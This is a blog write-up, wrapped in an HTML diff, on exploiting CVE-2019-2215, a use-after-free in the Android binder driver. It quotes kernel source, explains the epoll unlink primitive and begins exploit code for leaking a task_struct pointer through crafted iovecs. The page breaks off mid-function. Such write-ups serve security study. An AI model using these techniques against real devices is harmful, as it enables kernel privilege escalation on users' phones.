@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>exploiting CVE-2019-2215 | cutesmilee’s blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="exploiting CVE-2019-2215" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Brief introduction to binder, eventpoll subsystem and Vectored I/O" />
+<meta property="og:description" content="Brief introduction to binder, eventpoll subsystem and Vectored I/O" />
+<link rel="canonical" href="/kernel/linux/android/2022/02/17/cve-2019-2215_writeup.html" />
+<meta property="og:url" content="/kernel/linux/android/2022/02/17/cve-2019-2215_writeup.html" />
+<meta property="og:site_name" content="cutesmilee’s blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-02-17T12:37:41+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="exploiting CVE-2019-2215" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-17T12:37:41+00:00","datePublished":"2022-02-17T12:37:41+00:00","description":"Brief introduction to binder, eventpoll subsystem and Vectored I/O","headline":"exploiting CVE-2019-2215","mainEntityOfPage":{"@type":"WebPage","@id":"/kernel/linux/android/2022/02/17/cve-2019-2215_writeup.html"},"url":"/kernel/linux/android/2022/02/17/cve-2019-2215_writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="cutesmilee&apos;s blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">cutesmilee&#39;s blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">exploiting CVE-2019-2215</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-02-17T12:37:41+00:00" itemprop="datePublished">Feb 17, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><strong>Brief introduction to binder, eventpoll subsystem and Vectored I/O</strong></p>
+
+<p>Binder is an android-only kernel driver used for Inter Process Communication (IPC). We can interact with Binder through file operations like <code class="language-plaintext highlighter-rouge">ioctl()</code>. The other good thing is that <code class="language-plaintext highlighter-rouge">/dev/binder</code> is accessible from unprivileged users.</p>
+
+<p>Eventpoll subsystem (also known as epoll) is a scalable I/O event notification mechanism, which basically monitors multiple file descriptors to check what I/O operations can be done to them.<br />It’s represented in the linux kernel by the <code class="language-plaintext highlighter-rouge">eventpoll</code> struct:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">eventpoll</span> <span class="p">{</span>
+	<span class="cm">/*
+	 * This mutex is used to ensure that files are not removed
+	 * while epoll is using them. This is held during the event
+	 * collection loop, the file cleanup path, the epoll file exit
+	 * code and the ctl operations.
+	 */</span>
+	<span class="k">struct</span> <span class="n">mutex</span> <span class="n">mtx</span><span class="p">;</span>
+
+	<span class="cm">/* Wait queue used by sys_epoll_wait() */</span>
+	<span class="n">wait_queue_head_t</span> <span class="n">wq</span><span class="p">;</span>
+
+	<span class="cm">/* Wait queue used by file-&gt;poll() */</span>
+	<span class="n">wait_queue_head_t</span> <span class="n">poll_wait</span><span class="p">;</span>
+
+	<span class="cm">/* List of ready file descriptors */</span>
+	<span class="k">struct</span> <span class="n">list_head</span> <span class="n">rdllist</span><span class="p">;</span>
+
+	<span class="cm">/* Lock which protects rdllist and ovflist */</span>
+	<span class="n">rwlock_t</span> <span class="n">lock</span><span class="p">;</span>
+
+	<span class="cm">/* RB tree root used to store monitored fd structs */</span>
+	<span class="k">struct</span> <span class="n">rb_root_cached</span> <span class="n">rbr</span><span class="p">;</span>
+
+	<span class="cm">/*
+	 * This is a single linked list that chains all the "struct epitem" that
+	 * happened while transferring ready events to userspace w/out
+	 * holding -&gt;lock.
+	 */</span>
+	<span class="k">struct</span> <span class="n">epitem</span> <span class="o">*</span><span class="n">ovflist</span><span class="p">;</span>
+
+	<span class="cm">/* wakeup_source used when ep_scan_ready_list is running */</span>
+	<span class="k">struct</span> <span class="n">wakeup_source</span> <span class="o">*</span><span class="n">ws</span><span class="p">;</span>
+
+	<span class="cm">/* The user that created the eventpoll descriptor */</span>
+	<span class="k">struct</span> <span class="n">user_struct</span> <span class="o">*</span><span class="n">user</span><span class="p">;</span>
+
+	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+
+	<span class="cm">/* used to optimize loop detection check */</span>
+	<span class="n">u64</span> <span class="n">gen</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">hlist_head</span> <span class="n">refs</span><span class="p">;</span>
+
+<span class="cp">#ifdef CONFIG_NET_RX_BUSY_POLL
+</span>	<span class="cm">/* used to track busy poll napi_id */</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">napi_id</span><span class="p">;</span>
+<span class="cp">#endif
+</span>
+<span class="cp">#ifdef CONFIG_DEBUG_LOCK_ALLOC
+</span>	<span class="cm">/* tracks wakeup nests for lockdep validation */</span>
+	<span class="n">u8</span> <span class="n">nests</span><span class="p">;</span>
+<span class="cp">#endif
+</span><span class="p">};</span>
+</code></pre></div></div>
+
+<p>Vectored I/O is a way to write multiple buffers to a big one or read a big buffer into multiple buffers. In Linux / Android kernel we can use stuff like pipes or network sockets (with syscalls like <code class="language-plaintext highlighter-rouge">recvmsg()</code>) in order to use Vectored I/O.</p>
+
+<p>An iovec in the kernel is represented by the <code class="language-plaintext highlighter-rouge">iovec</code> struct:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">iovec</span> <span class="p">{</span>
+	<span class="kt">void</span> <span class="o">*</span>   <span class="n">iov_base</span><span class="p">;</span>      <span class="cm">/* [XSI] Base address of I/O memory region */</span>
+	<span class="kt">size_t</span>   <span class="n">iov_len</span><span class="p">;</span>       <span class="cm">/* [XSI] Size of region iov_base points to */</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">iov_base</code> points to the buffer with the data and <code class="language-plaintext highlighter-rouge">iov_len</code> is the length of the data.</p>
+
+<p>When we <code class="language-plaintext highlighter-rouge">read()</code> or <code class="language-plaintext highlighter-rouge">write()</code> to an iovec, <code class="language-plaintext highlighter-rouge">iov_len</code> amount of data are read from / written to the address stored in <code class="language-plaintext highlighter-rouge">iov_base</code>, which is good for exploitation primitive if we’re able to corrupt <code class="language-plaintext highlighter-rouge">iov_base</code> pointer. Iovecs also are a pretty good target since we can just allocate a stack of them in the kernel, so we can allocate them in every kmalloc zone we want.</p>
+
+<p><strong>Brief introduction to CVE-2019-2215</strong></p>
+
+<p>Binder has an exit function implemented through <code class="language-plaintext highlighter-rouge">ioctl()</code> called <code class="language-plaintext highlighter-rouge">BINDER_THREAD_EXIT</code> which frees the <code class="language-plaintext highlighter-rouge">binder_thread</code> struct:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">long</span> <span class="nf">binder_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">[...]</span>
+	<span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+	<span class="p">[...]</span>
+	<span class="k">case</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">:</span>
+		<span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_THREADS</span><span class="p">,</span> <span class="s">"%d:%d exit</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+			     <span class="n">proc</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="kr">thread</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+		<span class="n">binder_thread_release</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="kr">thread</span><span class="p">);</span>
+		<span class="kr">thread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">[...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">binder_thread_release</span><span class="p">(</span><span class="k">struct</span> <span class="n">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
+				 <span class="k">struct</span> <span class="n">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">binder_transaction</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">binder_transaction</span> <span class="o">*</span><span class="n">send_reply</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">active_transactions</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">binder_transaction</span> <span class="o">*</span><span class="n">last_t</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="p">[...]</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">send_reply</span><span class="p">)</span>
+		<span class="n">binder_send_failed_reply</span><span class="p">(</span><span class="n">send_reply</span><span class="p">,</span> <span class="n">BR_DEAD_REPLY</span><span class="p">);</span>
+	<span class="n">binder_release_work</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">);</span>
+	<span class="n">binder_thread_dec_tmpref</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
+	<span class="k">return</span> <span class="n">active_transactions</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">binder_thread_dec_tmpref</span><span class="p">(</span><span class="k">struct</span> <span class="n">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="cm">/*
+	 * atomic is used to protect the counter value while
+	 * it cannot reach zero or thread-&gt;is_dead is false
+	 */</span>
+	<span class="n">binder_inner_proc_lock</span><span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">proc</span><span class="p">);</span>
+	<span class="n">atomic_dec</span><span class="p">(</span><span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">tmp_ref</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">is_dead</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">tmp_ref</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">binder_inner_proc_unlock</span><span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">proc</span><span class="p">);</span>
+		<span class="n">binder_free_thread</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">binder_inner_proc_unlock</span><span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">proc</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">binder_free_thread</span><span class="p">(</span><span class="k">struct</span> <span class="n">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">BUG_ON</span><span class="p">(</span><span class="o">!</span><span class="n">list_empty</span><span class="p">(</span><span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">));</span>
+	<span class="n">binder_stats_deleted</span><span class="p">(</span><span class="n">BINDER_STAT_THREAD</span><span class="p">);</span>
+	<span class="n">binder_proc_dec_tmpref</span><span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">proc</span><span class="p">);</span>
+	<span class="n">put_task_struct</span><span class="p">(</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">);</span>
+	<span class="n">kfree</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Here in <code class="language-plaintext highlighter-rouge">binder_free_thread()</code> the <code class="language-plaintext highlighter-rouge">kfree()</code> frees the <code class="language-plaintext highlighter-rouge">binder_thread</code> struct. The problem comes when a <code class="language-plaintext highlighter-rouge">EPOLL_CTL_ADD</code> ioctl is issued before freeing <code class="language-plaintext highlighter-rouge">binder_thread</code> struct, in this case an epoll will be added to the waitqueue ( <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait</code>), and the <code class="language-plaintext highlighter-rouge">binder_thread</code> struct will be added to <code class="language-plaintext highlighter-rouge">eppoll_entry</code>’s linked list, now if we call <code class="language-plaintext highlighter-rouge">BINDER_THREAD_EXIT</code>, <code class="language-plaintext highlighter-rouge">binder_thread</code> struct will be freed, but it isn’t removed from  <code class="language-plaintext highlighter-rouge">eppoll_entry</code>’s linked list, so if we issue a <code class="language-plaintext highlighter-rouge">EPOLL_CTL_DEL</code> ioctl, it’ll access the <code class="language-plaintext highlighter-rouge">binder_thread</code> waitqueue, which leads to use-after-free.</p>
+
+<p><strong>Unlink primitive</strong></p>
+
+<p>When we issue the <code class="language-plaintext highlighter-rouge">EPOLL_CTL_DEL</code> ioctl many functions are called. <br />The important function is <code class="language-plaintext highlighter-rouge">remove_wait_queue()</code> (notice that <code class="language-plaintext highlighter-rouge">wait_queue_head_t *q</code> points to freed waitqueue).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">do_epoll_ctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">epfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">op</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">epoll_event</span> <span class="o">*</span><span class="n">epds</span><span class="p">,</span>
+		 <span class="n">bool</span> <span class="n">nonblock</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">error</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">full_check</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">fd</span> <span class="n">f</span><span class="p">,</span> <span class="n">tf</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">eventpoll</span> <span class="o">*</span><span class="n">ep</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">epitem</span> <span class="o">*</span><span class="n">epi</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">eventpoll</span> <span class="o">*</span><span class="n">tep</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="p">[...]</span>
+
+	<span class="k">switch</span> <span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="p">{</span>
+	<span class="p">[...]</span>
+	<span class="k">case</span> <span class="n">EPOLL_CTL_DEL</span><span class="p">:</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">epi</span><span class="p">)</span>
+			<span class="n">error</span> <span class="o">=</span> <span class="n">ep_remove</span><span class="p">(</span><span class="n">ep</span><span class="p">,</span> <span class="n">epi</span><span class="p">);</span>
+		<span class="k">else</span>
+			<span class="n">error</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">[...]</span>
+
+	<span class="k">return</span> <span class="n">error</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">ep_remove</span><span class="p">(</span><span class="k">struct</span> <span class="n">eventpoll</span> <span class="o">*</span><span class="n">ep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">epitem</span> <span class="o">*</span><span class="n">epi</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span> <span class="o">=</span> <span class="n">epi</span><span class="o">-&gt;</span><span class="n">ffd</span><span class="p">.</span><span class="n">file</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">epitems_head</span> <span class="o">*</span><span class="n">to_free</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">hlist_head</span> <span class="o">*</span><span class="n">head</span><span class="p">;</span>
+
+	<span class="n">lockdep_assert_irqs_enabled</span><span class="p">();</span>
+
+	<span class="cm">/*
+	 * Removes poll wait queue hooks.
+	 */</span>
+	<span class="n">ep_unregister_pollwait</span><span class="p">(</span><span class="n">ep</span><span class="p">,</span> <span class="n">epi</span><span class="p">);</span>
+
+	<span class="p">[...]</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">ep_unregister_pollwait</span><span class="p">(</span><span class="k">struct</span> <span class="n">eventpoll</span> <span class="o">*</span><span class="n">ep</span><span class="p">,</span> <span class="k">struct</span> <span class="n">epitem</span> <span class="o">*</span><span class="n">epi</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">eppoll_entry</span> <span class="o">**</span><span class="n">p</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">epi</span><span class="o">-&gt;</span><span class="n">pwqlist</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">eppoll_entry</span> <span class="o">*</span><span class="n">pwq</span><span class="p">;</span>
+
+	<span class="k">while</span> <span class="p">((</span><span class="n">pwq</span> <span class="o">=</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+		<span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">pwq</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+		<span class="n">ep_remove_wait_queue</span><span class="p">(</span><span class="n">pwq</span><span class="p">);</span>
+		<span class="n">kmem_cache_free</span><span class="p">(</span><span class="n">pwq_cache</span><span class="p">,</span> <span class="n">pwq</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">ep_remove_wait_queue</span><span class="p">(</span><span class="k">struct</span> <span class="n">eppoll_entry</span> <span class="o">*</span><span class="n">pwq</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">wait_queue_head_t</span> <span class="o">*</span><span class="n">whead</span><span class="p">;</span>
+
+	<span class="n">rcu_read_lock</span><span class="p">();</span>
+	<span class="cm">/*
+	 * If it is cleared by POLLFREE, it should be rcu-safe.
+	 * If we read NULL we need a barrier paired with
+	 * smp_store_release() in ep_poll_callback(), otherwise
+	 * we rely on whead-&gt;lock.
+	 */</span>
+	<span class="n">whead</span> <span class="o">=</span> <span class="n">smp_load_acquire</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pwq</span><span class="o">-&gt;</span><span class="n">whead</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">whead</span><span class="p">)</span>
+		<span class="n">remove_wait_queue</span><span class="p">(</span><span class="n">whead</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pwq</span><span class="o">-&gt;</span><span class="n">wait</span><span class="p">);</span>
+	<span class="n">rcu_read_unlock</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">remove_wait_queue</span><span class="p">(</span><span class="k">struct</span> <span class="n">wait_queue_head</span> <span class="o">*</span><span class="n">wq_head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">wait_queue_entry</span> <span class="o">*</span><span class="n">wq_entry</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">flags</span><span class="p">;</span>
+
+	<span class="n">spin_lock_irqsave</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wq_head</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+	<span class="n">__remove_wait_queue</span><span class="p">(</span><span class="n">wq_head</span><span class="p">,</span> <span class="n">wq_entry</span><span class="p">);</span>
+	<span class="n">spin_unlock_irqrestore</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wq_head</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span>
+<span class="nf">__remove_wait_queue</span><span class="p">(</span><span class="k">struct</span> <span class="n">wait_queue_head</span> <span class="o">*</span><span class="n">wq_head</span><span class="p">,</span> <span class="k">struct</span> <span class="n">wait_queue_entry</span> <span class="o">*</span><span class="n">wq_entry</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">list_del</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wq_entry</span><span class="o">-&gt;</span><span class="n">entry</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">list_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">entry</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">__list_del</span><span class="p">(</span><span class="n">entry</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">,</span> <span class="n">entry</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">);</span>
+	<span class="n">entry</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">LIST_POISON1</span><span class="p">;</span>
+	<span class="n">entry</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">LIST_POISON2</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">__list_del</span><span class="p">(</span><span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">,</span> <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">next</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">prev</span><span class="p">;</span>
+	<span class="n">prev</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">next</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As we can see <code class="language-plaintext highlighter-rouge">__list_del()</code> is called and writes the address of <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.head</code> to <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.task_list.next</code> and <code class="language-plaintext highlighter-rouge">binder_thread-&gt;wait.task_list.prev</code>.</p>
+
+<p><strong>Leaking task_struct kernel pointer</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">task_struct_leak()</code> is responsable for leaking the <code class="language-plaintext highlighter-rouge">task_struct</code> pointer. At first does preliminary jobs like opening <code class="language-plaintext highlighter-rouge">/dev/binder</code>, allocating an epoll and linking it, creating a pipe (which will be used later for reading the leaked address), changing the pipe size to a smaller value since we’ll need to fill it up completely later, a smaller pipe is better, we also <code class="language-plaintext highlighter-rouge">mmap()</code> a 0x1000 buffer, and setup the iovecs.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">task_struct_leak</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] opening /dev/binder</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">open_binder</span><span class="p">();</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] allocating epoll</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">epoll_alloc</span><span class="p">();</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] linking epoll</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">epoll_link</span><span class="p">();</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] setting up a pipe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">pipe</span><span class="p">(</span><span class="n">pipe_fd</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] failed to allocate a pipe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] changing pipe size to 0x1000</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fcntl</span><span class="p">(</span><span class="n">READ_PIPE</span><span class="p">,</span> <span class="n">F_SETPIPE_SZ</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] unable to change the pipe capacity</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* used later to unblock the write and avoid deadlocking */</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] allocating the dummy page</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">dummy_page</span> <span class="o">=</span> <span class="n">map_dummy_page</span><span class="p">();</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">dummy_page</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] unable to mmap the dummy page</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] crafting iovecs to leak task_struct</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">dummy_page</span><span class="p">;</span>
+    <span class="n">iovec</span><span class="p">[</span><span class="n">IOVEC_OVERLAP_INDEX</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
